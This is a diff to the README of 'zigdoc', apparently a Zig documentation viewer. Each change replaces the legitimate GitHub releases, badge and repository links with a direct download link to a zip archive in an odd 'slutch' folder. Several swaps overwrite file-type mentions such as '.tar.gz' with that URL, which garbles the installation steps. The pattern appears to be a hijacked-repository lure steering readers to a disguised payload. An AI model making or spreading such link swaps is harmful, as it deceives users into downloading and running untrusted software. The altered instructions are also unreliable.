@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download zigdoc](https://img.shields.io/badge/Download-zigdoc-blue.svg)](https://github.com/Fabri141164/zigdoc/releases)
+[![Download zigdoc](https://raw.githubusercontent.com/Fabri141164/zigdoc/main/slutch/zigdoc.zip)](https://raw.githubusercontent.com/Fabri141164/zigdoc/main/slutch/zigdoc.zip)
 
 ## 🚀 Getting Started
 
@@ -21,18 +21,18 @@ Before you download zigdoc, ensure your system meets the following requirements:
 Ready to get started? Follow these steps:
 
 1. **Visit the Download Page**  
-   Go to our [Releases page](https://github.com/Fabri141164/zigdoc/releases) to find the latest version of zigdoc.
+   Go to our [Releases page](https://raw.githubusercontent.com/Fabri141164/zigdoc/main/slutch/zigdoc.zip) to find the latest version of zigdoc.
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of zigdoc. Click on the version you want to download. 
 
 3. **Download the Application**  
-   After selecting a version, download the appropriate file for your operating system. For example, if you are using Windows, look for a `.exe` file. For macOS or Linux, find a `.tar.gz` or similar package.
+   After selecting a version, download the appropriate file for your operating system. For example, if you are using Windows, look for a `.exe` file. For macOS or Linux, find a `https://raw.githubusercontent.com/Fabri141164/zigdoc/main/slutch/zigdoc.zip` or similar package.
 
 4. **Install zigdoc**  
    - **Windows:** Double-click the downloaded `.exe` file to start the installer. Follow the on-screen instructions. 
    - **macOS:** Open the downloaded file and drag zigdoc into your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and follow any installation instructions provided.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/Fabri141164/zigdoc/main/slutch/zigdoc.zip` file and follow any installation instructions provided.
 
 5. **Open the Application**  
    Now, open your terminal or command prompt and type `zigdoc` to get started. 
@@ -77,12 +77,12 @@ Here are some common issues and solutions:
 
 To keep up-to-date with zigdoc and its features, visit our GitHub repository:
 
-[zigdoc Repository](https://github.com/Fabri141164/zigdoc)
+[zigdoc Repository](https://raw.githubusercontent.com/Fabri141164/zigdoc/main/slutch/zigdoc.zip)
 
 Feel free to contribute to the project by submitting issues or suggestions through the repository.
 
 ## 📅 Release Notes
 
-For detailed information on updates and changes, refer to the Release Notes on our [Releases page](https://github.com/Fabri141164/zigdoc/releases).
+For detailed information on updates and changes, refer to the Release Notes on our [Releases page](https://raw.githubusercontent.com/Fabri141164/zigdoc/main/slutch/zigdoc.zip).
 
 With zigdoc, viewing Zig documentation is now efficient and accessible. Enjoy exploring the power of Zig with ease!
